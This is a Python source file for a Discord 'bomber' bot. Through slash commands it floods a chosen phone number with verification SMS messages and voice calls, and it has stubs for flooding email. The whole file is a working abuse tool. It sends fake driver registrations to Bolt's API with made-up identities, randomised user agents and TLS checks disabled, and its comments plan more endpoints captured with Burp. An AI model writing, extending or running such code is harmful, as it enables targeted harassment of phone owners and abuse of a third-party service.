#!/usr/bin/env python3
"""
Discord Bomber Bot - SMS + EMAIL
/bombN = Numeros (SMS/Call)
/bombC = Correos (Email)
"""

import discord
from discord.ext import commands
from discord import app_commands
import requests
import asyncio
import uuid
import os
import random
import urllib3
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings()

TOKEN = os.environ.get("DISCORD_TOKEN")
if not TOKEN:
    print("ERROR: Configura DISCORD_TOKEN")
    exit(1)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)
executor = ThreadPoolExecutor(max_workers=30)


class Bomber:
    def __init__(self):
        self.results = {"sms_ok": 0, "sms_fail": 0, "call_ok": 0, "call_fail": 0, "email_ok": 0, "email_fail": 0}
        self.session = requests.Session()
        self.session.verify = False
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile",
        ]

    def reset(self):
        self.results = {"sms_ok": 0, "sms_fail": 0, "call_ok": 0, "call_fail": 0, "email_ok": 0, "email_fail": 0}

    def random_ua(self):
        return random.choice(self.user_agents)

    def gen_uuid(self):
        return str(uuid.uuid4())

    def gen_email(self):
        return f"user{uuid.uuid4().hex[:8]}@gmail.com"

    def gen_name(self):
        nombres = ["Carlos", "Maria", "Juan", "Ana", "Pedro", "Laura", "Miguel", "Carmen"]
        apellidos = ["Garcia", "Martinez", "Lopez", "Sanchez", "Gonzalez", "Rodriguez"]
        return random.choice(nombres), random.choice(apellidos)

    # ==========================================
    # SMS APIS - VERIFICADAS CON BURP
    # ==========================================

    def bolt_driver_sms(self, phone):
        """Bolt Driver - SMS (VERIFICADO)"""
        try:
            url1 = "https://driverregistration.live.boltsvc.net/driverRegistration/startRegistration"
            params = {"version": "HP.24.33", "device_name": "HP", "device_os_version": "web",
                      "deviceId": "web", "deviceType": "web", "language": "es-es"}
            nombre, apellido = self.gen_name()
            data1 = {"email": self.gen_email(), "phone": phone, "city_id": 1617,
                     "first_name": nombre, "last_name": apellido, "terms_consent_accepted": 1}
            headers = {"User-Agent": self.random_ua(), "Content-Type": "application/json"}

            resp1 = self.session.post(url1, params=params, json=data1, headers=headers, timeout=15)
            if resp1.status_code != 200:
                return False, f"Error {resp1.status_code}"

            token = resp1.json().get("data", {}).get("token")
            if not token:
                return False, resp1.json().get("message", "Sin token")

            url2 = "https://driverregistration.live.boltsvc.net/driverRegistration/startVerification?brand=bolt"
            data2 = {"token": token, "verification_code_channel": "sms", "device_os_version": "web",
                     "device_name": self.random_ua(), "deviceId": self.gen_uuid(), "device_type": "web",
                     "version": "DR.3.90", "language": "es-es", "visitor_id": f"visitor-{self.gen_uuid()}"}

            resp2 = self.session.post(url2, json=data2, headers=headers, timeout=15)
            if resp2.status_code == 200 and resp2.json().get("code") == 0:
                return True, "SMS ENVIADO"
            return False, resp2.json().get("message", "Error")
        except Exception as e:
            return False, str(e)[:50]

    def bolt_driver_call(self, phone):
        """Bolt Driver - LLAMADA (VERIFICADO)"""
        try:
            url1 = "https://driverregistration.live.boltsvc.net/driverRegistration/startRegistration"
            params = {"version": "HP.24.33", "device_name": "HP", "device_os_version": "web",
                      "deviceId": "web", "deviceType": "web", "language": "es-es"}
            nombre, apellido = self.gen_name()
            data1 = {"email": self.gen_email(), "phone": phone, "city_id": 1617,
                     "first_name": nombre, "last_name": apellido, "terms_consent_accepted": 1}
            headers = {"User-Agent": self.random_ua(), "Content-Type": "application/json"}

            resp1 = self.session.post(url1, params=params, json=data1, headers=headers, timeout=15)
            if resp1.status_code != 200:
                return False, f"Error {resp1.status_code}"

            token = resp1.json().get("data", {}).get("token")
            if not token:
                return False, resp1.json().get("message", "Sin token")

            url2 = "https://driverregistration.live.boltsvc.net/driverRegistration/startVerification?brand=bolt"
            data2 = {"token": token, "verification_code_channel": "call", "device_os_version": "web",
                     "device_name": self.random_ua(), "deviceId": self.gen_uuid(), "device_type": "web",
                     "version": "DR.3.90", "language": "es-es", "visitor_id": f"visitor-{self.gen_uuid()}"}

            resp2 = self.session.post(url2, json=data2, headers=headers, timeout=15)
            if resp2.status_code == 200 and resp2.json().get("code") == 0:
                return True, "LLAMADA ENVIADA"
            return False, resp2.json().get("message", "Error")
        except Exception as e:
            return False, str(e)[:50]

    # TODO: Añadir mas APIs SMS cuando las capturemos con Burp
    # def vinted_sms(self, phone): ...
    # def getir_sms(self, phone): ...

    # ==========================================
    # EMAIL APIS - PENDIENTE CAPTURAR
    # ==========================================

    # TODO: Añadir APIs de email cuando las capturemos
    # def wallapop_email(self, email): ...
    # def pccomponentes_email(self, email): ...

    def get_sms_services(self):
        return [("Bolt SMS", self.bolt_driver_sms)]

    def get_call_services(self):
        return [("Bolt CALL", self.bolt_driver_call)]

    def get_email_services(self):
        return []  # TODO: Añadir cuando capturemos

    async def bomb_number(self, phone, count, include_calls=False):
        """Bombardear numero con SMS y opcionalmente llamadas"""
        loop = asyncio.get_event_loop()
        sms_services = self.get_sms_services()
        call_services = self.get_call_services() if include_calls else []

        for i in range(count):
            # SMS
            for name, func in sms_services:
                success, msg = await loop.run_in_executor(executor, func, phone)
                if success:
                    self.results["sms_ok"] += 1
                else:
                    self.results["sms_fail"] += 1
                yield "SMS", name, success, msg

                if "LIMIT" in msg.upper():
                    return
                await asyncio.sleep(0.3)

            # Calls
            for name, func in call_services:
                success, msg = await loop.run_in_executor(executor, func, phone)
                if success:
                    self.results["call_ok"] += 1
                else:
                    self.results["call_fail"] += 1
                yield "CALL", name, success, msg

                if "LIMIT" in msg.upper():
                    return
                await asyncio.sleep(0.3)

    async def bomb_email(self, email, count):
        """Bombardear email"""
        loop = asyncio.get_event_loop()
        services = self.get_email_services()

        if not services:
            yield "EMAIL", "Sin servicios", False, "No hay APIs de email configuradas"
            return

        for i in range(count):
            for name, func in services:
                success, msg = await loop.run_in_executor(executor, func, email)
                if success:
                    self.results["email_ok"] += 1
                else:
                    self.results["email_fail"] += 1
                yield "EMAIL", name, success, msg
                await asyncio.sleep(0.3)


bomber = Bomber()


@bot.event
async def on_ready():
    print(f"="*50)
    print(f"  BOMBER BOT v2 - SMS + EMAIL")
    print(f"  Bot: {bot.user}")
    print(f"  SMS: {len(bomber.get_sms_services())} servicios")
    print(f"  CALL: {len(bomber.get_call_services())} servicios")
    print(f"  EMAIL: {len(bomber.get_email_services())} servicios")
    print(f"="*50)
    try:
        await bot.tree.sync()
    except Exception as e:
        print(f"Error sync: {e}")


# ==========================================
# COMANDOS DE NUMERO (SMS/CALL)
# ==========================================

@bot.tree.command(name="bombn", description="Bombardear NUMERO con SMS")
@app_commands.describe(phone="Numero (+34...)", count="Cantidad (1-50)")
async def bombn_cmd(interaction: discord.Interaction, phone: str, count: int = 10):
    if not phone.startswith("+"):
        phone = "+34" + phone
    count = max(1, min(count, 50))
    bomber.reset()

    await interaction.response.send_message(
        f"```ansi\n\x1b[1;33mSMS BOMBER\x1b[0m - {phone}\nEnviando {count} rondas...\n```"
    )

    async for tipo, name, success, msg in bomber.bomb_number(phone, count, include_calls=False):
        status = "\x1b[32mOK\x1b[0m" if success else "\x1b[31mFAIL\x1b[0m"
        await interaction.edit_original_response(content=
            f"```ansi\n\x1b[1;33mSMS BOMBER\x1b[0m\n"
            f"Target: {phone}\n"
            f"Ultimo: {name} - {status}\n"
            f"\x1b[32mSMS OK: {bomber.results['sms_ok']}\x1b[0m | Fail: {bomber.results['sms_fail']}\n"
            f"Msg: {msg[:40]}\n```"
        )

    await interaction.edit_original_response(content=
        f"```ansi\n\x1b[1;32mCOMPLETADO\x1b[0m - {phone}\n"
        f"\x1b[32mSMS ENVIADOS: {bomber.results['sms_ok']}\x1b[0m\n"
        f"Fallidos: {bomber.results['sms_fail']}\n```"
    )


@bot.tree.command(name="calln", description="Bombardear NUMERO con LLAMADAS")
@app_commands.describe(phone="Numero (+34...)", count="Cantidad (1-50)")
async def calln_cmd(interaction: discord.Interaction, phone: str, count: int = 10):
    if not phone.startswith("+"):
        phone = "+34" + phone
    count = max(1, min(count, 50))
    bomber.reset()

    await interaction.response.send_message(
        f"```ansi\n\x1b[1;35mCALL BOMBER\x1b[0m - {phone}\nLlamando {count} veces...\n```"
    )

    services = bomber.get_call_services()
    loop = asyncio.get_event_loop()

    for i in range(count):
        for name, func in services:
            success, msg = await loop.run_in_executor(executor, func, phone)
            if success:
                bomber.results["call_ok"] += 1
            else:
                bomber.results["call_fail"] += 1

            status = "\x1b[32mOK\x1b[0m" if success else "\x1b[31mFAIL\x1b[0m"
            await interaction.edit_original_response(content=
                f"```ansi\n\x1b[1;35mCALL BOMBER\x1b[0m\n"
                f"Target: {phone}\n"
                f"Progreso: {i+1}/{count}\n"
                f"\x1b[35mCALL OK: {bomber.results['call_ok']}\x1b[0m | Fail: {bomber.results['call_fail']}\n"
                f"Msg: {msg[:40]}\n```"
            )

            if "LIMIT" in msg.upper():
                break
            await asyncio.sleep(0.3)

    await interaction.edit_original_response(content=
        f"```ansi\n\x1b[1;32mCOMPLETADO\x1b[0m - {phone}\n"
        f"\x1b[35mLLAMADAS OK: {bomber.results['call_ok']}\x1b[0m\n"
        f"Fallidas: {bomber.results['call_fail']}\n```"
    )


@bot.tree.command(name="nuken", description="NUKE numero (SMS + LLAMADAS)")
@app_commands.describe(phone="Numero (+34...)", count="Rondas (1-30)")
async def nuken_cmd(interaction: discord.Interaction, phone: str, count: int = 10):
    if not phone.startswith("+"):
        phone = "+34" + phone
    count = max(1, min(count, 30))
    bomber.reset()

    await interaction.response.send_message(
        f"```ansi\n\x1b[1;31mNUKE MODE\x1b[0m - {phone}\n{count} rondas de SMS+CALL\n```"
    )

    async for tipo, name, success, msg in bomber.bomb_number(phone, count, include_calls=True):
        status = "\x1b[32mOK\x1b[0m" if success else "\x1b[31mFAIL\x1b[0m"
        total = bomber.results['sms_ok'] + bomber.results['call_ok']
        await interaction.edit_original_response(content=
            f"```ansi\n\x1b[1;31mNUKE\x1b[0m - {phone}\n"
            f"{tipo}: {name} - {status}\n"
            f"SMS: {bomber.results['sms_ok']} | CALL: {bomber.results['call_ok']}\n"
            f"Total OK: {total}\n```"
        )

    total = bomber.results['sms_ok'] + bomber.results['call_ok']
    await interaction.edit_original_response(content=
        f"```ansi\n\x1b[1;32mNUKE COMPLETADO\x1b[0m\n"
        f"Target: {phone}\n"
        f"\x1b[32mSMS: {bomber.results['sms_ok']}\x1b[0m | \x1b[35mCALL: {bomber.results['call_ok']}\x1b[0m\n"
        f"\x1b[33mTOTAL: {total}\x1b[0m\n```"
    )


# ==========================================
# COMANDOS DE EMAIL
# ==========================================

@bot.tree.command(name="bombc", description="Bombardear CORREO con emails")
@app_commands.describe(email="Email a bombardear", count="Cantidad (1-50)")
async def bombc_cmd(interaction: discord.Interaction, email: str, count: int = 10):
    count = max(1, min(count, 50))
    bomber.reset()

    services = bomber.get_email_services()
    if not services:
        await interaction.response.send_message(
            f"```ansi\n\x1b[1;31mERROR\x1b[0m\n"
            f"No hay APIs de email configuradas todavia.\n"
            f"Necesitamos capturarlas con Burp Suite.\n```"
        )
        return

    await interaction.response.send_message(
        f"```ansi\n\x1b[1;36mEMAIL BOMBER\x1b[0m - {email}\nEnviando {count} rondas...\n```"
    )

    async for tipo, name, success, msg in bomber.bomb_email(email, count):
        status = "\x1b[32mOK\x1b[0m" if success else "\x1b[31mFAIL\x1b[0m"
        await interaction.edit_original_response(content=
            f"```ansi\n\x1b[1;36mEMAIL BOMBER\x1b[0m\n"
            f"Target: {email}\n"
            f"Ultimo: {name} - {status}\n"
            f"\x1b[36mEMAIL OK: {bomber.results['email_ok']}\x1b[0m | Fail: {bomber.results['email_fail']}\n```"
        )

    await interaction.edit_original_response(content=
        f"```ansi\n\x1b[1;32mCOMPLETADO\x1b[0m - {email}\n"
        f"\x1b[36mEMAILS ENVIADOS: {bomber.results['email_ok']}\x1b[0m\n"
        f"Fallidos: {bomber.results['email_fail']}\n```"
    )


# ==========================================
# AYUDA
# ==========================================

@bot.tree.command(name="help", description="Ver comandos")
async def help_cmd(interaction: discord.Interaction):
    sms = len(bomber.get_sms_services())
    call = len(bomber.get_call_services())
    email = len(bomber.get_email_services())

    await interaction.response.send_message(
        f"```ansi\n"
        f"\x1b[1;36mBOMBER BOT v2\x1b[0m\n"
        f"{'='*40}\n"
        f"\x1b[1;33mNUMEROS:\x1b[0m\n"
        f"  /bombn <numero> <cantidad> - SMS\n"
        f"  /calln <numero> <cantidad> - Llamadas\n"
        f"  /nuken <numero> <cantidad> - SMS+Call\n"
        f"\n"
        f"\x1b[1;36mCORREOS:\x1b[0m\n"
        f"  /bombc <email> <cantidad> - Emails\n"
        f"\n"
        f"\x1b[1;32mSERVICIOS:\x1b[0m\n"
        f"  SMS: {sms} | CALL: {call} | EMAIL: {email}\n"
        f"{'='*40}\n"
        f"```"
    )


# Comandos con prefijo !
@bot.command(name="bombn")
async def bombn_prefix(ctx, phone: str, count: int = 10):
    if not phone.startswith("+"): phone = "+34" + phone
    count = max(1, min(count, 50))
    bomber.reset()
    msg = await ctx.send(f"```SMS -> {phone}...```")
    async for tipo, name, success, m in bomber.bomb_number(phone, count):
        await msg.edit(content=f"```SMS OK: {bomber.results['sms_ok']} | {m[:30]}```")
    await msg.edit(content=f"```COMPLETADO - SMS: {bomber.results['sms_ok']}```")

@bot.command(name="bombc")
async def bombc_prefix(ctx, email: str, count: int = 10):
    services = bomber.get_email_services()
    if not services:
        await ctx.send("```No hay APIs de email configuradas```")
        return
    count = max(1, min(count, 50))
    bomber.reset()
    msg = await ctx.send(f"```EMAIL -> {email}...```")
    async for tipo, name, success, m in bomber.bomb_email(email, count):
        await msg.edit(content=f"```EMAIL OK: {bomber.results['email_ok']}```")
    await msg.edit(content=f"```COMPLETADO - EMAIL: {bomber.results['email_ok']}```")


if __name__ == "__main__":
    print(f"\nBOMBER BOT v2")
    print(f"SMS: {len(Bomber().get_sms_services())}")
    print(f"CALL: {len(Bomber().get_call_services())}")
    print(f"EMAIL: {len(Bomber().get_email_services())}")
    bot.run(TOKEN)
